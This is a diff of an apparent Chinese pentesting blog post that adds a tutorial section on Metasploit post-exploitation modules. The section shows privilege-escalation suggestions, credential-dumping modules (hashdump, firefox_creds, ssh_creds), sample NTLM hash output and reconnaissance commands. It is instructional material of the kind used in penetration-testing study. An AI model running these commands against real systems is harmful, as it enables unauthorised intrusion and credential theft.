@@ -32,8 +32,13 @@
 <meta property="og:image" content="http://example.com/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250127113100783.png">
 <meta property="og:image" content="http://example.com/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250127113114802.png">
 <meta property="og:image" content="http://example.com/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250127113129493.png">
+<meta property="og:image" content="http://example.com/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250128194715773.png">
+<meta property="og:image" content="http://example.com/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250128194746463.png">
+<meta property="og:image" content="http://example.com/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250128195006333.png">
+<meta property="og:image" content="http://example.com/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250128195148389.png">
+<meta property="og:image" content="http://example.com/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250128195207654.png">
 <meta property="article:published_time" content="2025-01-27T03:24:59.000Z">
-<meta property="article:modified_time" content="2025-01-27T03:31:47.480Z">
+<meta property="article:modified_time" content="2025-01-28T11:53:49.910Z">
 <meta property="article:author" content="0ldcat">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -195,7 +200,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.3k 个字
+      3k 个字
     </span>
   
 
@@ -204,7 +209,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      12 分钟
+      26 分钟
     </span>
   
 
@@ -264,6 +269,30 @@
 <p><strong>⼩技巧</strong></p>
 <p>我⾸先是在&#x2F;root⽬录下建立了⼀个ips.txt文本，⾥⾯是我要扫描的IP:</p>
 <p>set rhosts file:&#x2F;root&#x2F;ips.txt</p>
+<h1 id="post模块"><a href="#post模块" class="headerlink" title="post模块"></a>post模块</h1><p><strong>后渗透操作</strong></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">在获取到一枚Meterpreter的<span class="hljs-built_in">shell</span>之后，就可以进行下一步的渗透，这就是传说中的后<br>渗透了<br><br>那msf中的<span class="hljs-built_in">post</span>模块就是⼀个后渗透模块，⾥⾯包含各种后渗透中有可能⽤到的功能，最多的就<br>是信息收集。<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250128194715773.png" srcset="/img/loading.gif" lazyload alt="image-20250128194715773"></p>
+<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">那么我这边就模拟⼀下拿到cmdshell后的操作：<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250128194746463.png" srcset="/img/loading.gif" lazyload alt="image-20250128194746463"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">可以看到，我这边sessions是有⼀个meterpreter会话：<br><span class="hljs-keyword">session</span><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>在后渗透的时候，我们可以使⽤post模块辅助我们</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">post<span class="hljs-regexp">/multi/</span>recon/local_exploit_suggester<br>post<span class="hljs-regexp">/windows/g</span>ather/hashdump<br>post<span class="hljs-regexp">/windows/g</span>ather/smart_hashdump<br>post<span class="hljs-regexp">/multi/g</span>ather/firefox_creds<br>post<span class="hljs-regexp">/multi/g</span>ather<span class="hljs-regexp">/ssh_credspost/</span>windows<span class="hljs-regexp">/gather/</span>enumapplicatio<br>...等等<br></code></pre></div></td></tr></table></figure>
+
+<figure class="highlight mercury"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mercury">post/<span class="hljs-keyword">multi</span>/recon/local_exploit_suggester<br>假设我们拿到⼀个cmdshell，但是权限很⼩，那我们可以使⽤这个模块来建议我们提权：<br>post/<span class="hljs-keyword">multi</span>/recon/local_exploit_suggester<br>下⾯是它的⼀个介绍:<br>msf5 &gt; info post/<span class="hljs-keyword">multi</span>/recon/local_exploit_suggester<br>......<br>从上⾯的banner可以看到，它⽀持的平台挺多的，比如windows、Android…等等<br><br>run运⾏后它会比较慢，因为它会查询systeminfo来看看那些补丁没打，从⽽探测可以使⽤那些<br>exploit来进⾏提权：<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250128195006333.png" srcset="/img/loading.gif" lazyload alt="image-20250128195006333"></p>
+<p>run执⾏完毕后，msf给出了我们两个exploit：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">exploit/windows/<span class="hljs-keyword">local</span>/ms10_092_schelevator: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br>exploit/windows/<span class="hljs-keyword">local</span>/ms16_014_wmi_recv_notif: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250128195148389.png" srcset="/img/loading.gif" lazyload alt="image-20250128195148389"></p>
+<h2 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a><strong>hashdump</strong></h2><p><strong>hashdump****是查询密码hash：</strong></p>
+<p><strong>因为有时候你得搜集密码来进⾏爆破别的⽤户</strong></p>
+<p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250128195207654.png" srcset="/img/loading.gif" lazyload alt="image-20250128195207654"></p>
+<figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">meterpreter &gt; hashdump<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c <span class="hljs-number">59</span>d7e0c089c0:::<br><span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c0 <span class="hljs-number">89</span>c0:::<br><span class="hljs-symbol">hack:</span><span class="hljs-number">1001</span>:aad3b435b51404eeaad3b435b51404ee:f39934a2710a469b3c63ce148779 <span class="hljs-number">4514</span>:::<br><span class="hljs-symbol">liuwx:</span><span class="hljs-number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c <span class="hljs-number">089</span>c0:::<br><br>信息收集：<br>run post<span class="hljs-keyword">/windows/</span>gather/checkvm <span class="hljs-meta">#是否虚拟机</span><br>run post<span class="hljs-keyword">/linux/</span>gather/checkvm <span class="hljs-meta">#是否虚拟机</span><br>run post<span class="hljs-keyword">/windows/</span>gather<span class="hljs-keyword">/forensics/</span>enum_drives <span class="hljs-meta">#查看分区</span><br>run post<span class="hljs-keyword">/windows/</span>gather/enum_applications <span class="hljs-meta">#获取安装软件信息</span><br>run post<span class="hljs-keyword">/windows/</span>gather/dumplinks <span class="hljs-meta">#获取最近的文件操作</span><br>run post<span class="hljs-keyword">/windows/</span>gather/enum_ie <span class="hljs-meta">#获取IE缓存</span><br>run post<span class="hljs-keyword">/windows/</span>gather/enum_chrome <span class="hljs-meta">#获取Chrome缓存</span><br>run post<span class="hljs-keyword">/windows/</span>gather/enum_patches <span class="hljs-meta">#补丁信息</span><br>run post<span class="hljs-keyword">/windows/</span>gather/enum_domain <span class="hljs-meta">#查找域控</span><br></code></pre></div></td></tr></table></figure>
+
 
             </div>
             <hr>
